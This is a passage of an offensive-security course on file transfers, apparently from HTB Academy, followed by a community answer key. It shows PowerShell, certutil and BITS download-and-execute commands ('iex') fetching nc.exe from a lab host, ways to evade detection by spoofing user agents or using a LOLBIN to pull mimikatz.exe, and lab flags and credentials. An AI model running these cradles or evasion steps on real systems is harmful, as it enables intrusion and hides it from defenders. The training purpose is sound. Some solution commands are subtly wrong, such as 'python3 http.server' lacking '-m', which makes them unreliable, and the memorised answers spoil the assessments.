To decrypt the file again, PowerShell is used on the Pwnbox. There, similar steps as on the Windows system take place. First, the script should be imported as a module, and then the file should be decrypted.

```
htb[/htb]$ pwsh

PS /home/htb-student/htb> Import-Module Invoke-AESEncryption.ps1

PS /home/htb-student/htb> Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path ./scan-results.txt.aes

File decrypted to /home/htb-student/htb/scan-results.txt

PS /home/htb-student/htb> ls

Invoke-AESEncryption.ps1     scan-results.txt.aes     scan-results.txt
```

Detection
---------

Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command-lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting of any unusual command-lines.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the HTTP protocol. There is a need for interoperability amongst different web server and web browser types to ensure that users have the same experience no matter the browser they are using. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or nmap.

Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows update and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform some malicious action. This [website](http://useragentstring.com/index.php) is very useful for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5.

Invoke-WebRequest
-----------------

```
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 

PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
````

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

WinHttpRequest
--------------

```
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;

PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);

PS C:\htb> $h.send();

PS C:\htb> iex $h.ResponseText
```

```
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

Msxml2
------

```
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;

PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);

PS C:\htb> $h.send();

PS C:\htb> iex $h.responseText
```

```
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

Certutil
--------

```
PS C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
PS C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

```
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

BITS
----

```
PS C:\htb> Import-Module bitstransfer;

PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;

PS C:\htb> $r=gc $env:temp\t;

PS C:\htb> rm $env:temp\t; 

PS C:\htb> iex $r
```

```
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

Evading Detection
=================

Changing User-Agent
-------------------

In case diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, then setting this User Agent may make the request seem legitimate.

```
PS C:\htb> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

```
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

```
htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

LOLBAS / GTFOBins
-----------------

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems, and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

```
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the GTFOBins project and is definitely also worth checking out. As of the time of writing, the [GTFOBins](https://gtfobins.github.io/) project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.


# HTB Academy 


## Module File Transfers Questions Solutions


`Page 2 / Windows File Transfer Methods`

Q1: Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.
A: b1a4ca918282fcd96004565521944a3b
##
Solution
--------

Use the following command to download the file using wget
```
$  wget http://10.129.47.41/flag.txt
```
This command download the file to your current directory
after you download it use cat command to view the flag
```
$ cat flag.txt
```

Q2: Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, RDP to the box, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
A: f458303ea783c224c6b4e7ef7f17eb9d

Solution
--------
First we have to download Upload_win.zip from HackTheBox Academy when you download it on your pc the use the follwoing command to unzip that file 
```
$ unzip Upload_win.zip
```
this will unzip that file note use this command on the same directory where you download that file 

Now when to unzip that file you get the text file name upload_win.txt so this file containing a hash that we decode it from the target pc so first we have to upload this into target system so we have to follow the following steps to upload this to target system

1. first we have to start a web server to the directory where we have the file upload_win.txt with the following command 
```
$ sudo python3 http.server 8080
```
this will start a http server on port 8080 on your system so now you have the file and start the server now we can upload this on the target system 

2. Now we have to connect to the htb academy vpn first so first download the vpn key from htb academy and use the following command to connect to the vpn
```
$ sudo openvpn < academy vpn key path > 
```
this will connect you to the htb academy vpn if everything goes well

3. Now RDP to the target using the xfreerdp if you don't install it so install it using the following command 
```
$ sudo apt install xfreerdp
```
this will install xfreerdp to your system now rdp to the target using following command
```
$ xfreerdp /v:[IP of the target here] /u:htb-student /p:HTB_@cademy_stdnt!
```
this will connect you to the target pc using rdp 

`NOTE: You have to connect to the academy vpn first otherewise you wont connect to it` 

4. Now you connect to the target rdp so open powershell on the system and use the following command to download the file in the system 

```

(New-Object System.Net.WebClient).DownloadFile('http://<Your tun ip here>:8080/upload_win.txt',"C:\Users\Public\Downloads\upload_win.txt")

```

Use this command of the target powershell and note you have to put your Tun IP address to the command first if you don't know your tun ip address so use the following command on your system to view your tun ip address
```
$ ip a
```
This will show you all the ip address on your system containing loopback(lo),eth0 and tun0 so use tun0 ip address on the above command

5. when you use above command on the target powershell this will download the upload_win.zip to your target system on the `C:\Users\Public\Downloads\Upload_win.txt` path so go there and put it on your target desktop and after that open the cmd on your target system

6. After open the cmd on the target use the following command to go to the desktpot of the target system desktop in cmd
```
$ cd Desktop
```
when you use above command then "dir" command to see the file if not so will not paste the file to the desktop or you are on the diffrent user desktop so do it right and if your see the file then use the following command
```
$ hasher upload_win.txt
```
this will give you a hash and submit it to the academy as your answer


`Page 3 / Linux File Transfer Methods`

Q1: Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
A: 5d21cf3da9c0ccb94f709e2559f3ea50
### Solution

Open your terminal and use the following command 
```
$ python3
```
After that they will open python3 on your terminal and make sure the python3 install on your system if not use the following command first the use the above command
```
$ sudo apt install python3
```
So when you open the python3 on your terminal paste the following command on the terminal where you open python3
but first paste the Target Machine Ip on the following command.So when you Do it on the python3 they will download the file on your system most probabily on your system /temp directory so keep an eye on your terminal respose where the put it 

```
import urllib.request
urllib.request.urlretrieve("http://<Target Machine IP Here>/flag.txt")
```


Q2: Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, unzip the file, and run "hasher upload_nix.txt" from the command line. Submit the generated hash as your answer.
A: 159cfe5c65054bbadb2761cfa359c8b0
### Solution


To find that hash you have to first download the upload_nix.zip file on your system on htb academy link once you download it unzip it using the following command
```
$ unzip upload_nix.zip
```
After that they will give you a text file name upload_nix.zip file that contain a hash that you use to crack to get the flag so to do that you have to active python3 http server on that directory where your file exits in that directory use the following command 
```
$ python3 http.server 8080 
```
They will start a http server on your system port 8080 so now you have to ssh to the target using the following command 
```
$ ssh htb-student@<Target IP here>
```
give him password HTB_@cademy_stdnt!

So now you are on target system so you use the following command on the target system
```
$ curl http://<Attacking Machine IP Here>:8080/upload_nix.txt -o /tmp/upload.txt
``` 
 `NOTE: Attacking machine ip are your machine ip tun0 interface ip address you can see it using the following command on your system terminal` 
```
 $ ip a 
```
This will show you all your interface ip address but you have to use your "tun" interface ip address that show you when you are connected to the htb academy vpn so you have to connect to the vpn and use that ip address   

So After that you will get upload_nix.txt file on your target system /tmp directory with the name upload.txt
When you get the file on your target machine so use the follwoing command on your target system terminal to get the flag
```
$ hasher /tmp/upload.txt
```
This will give you the above flag

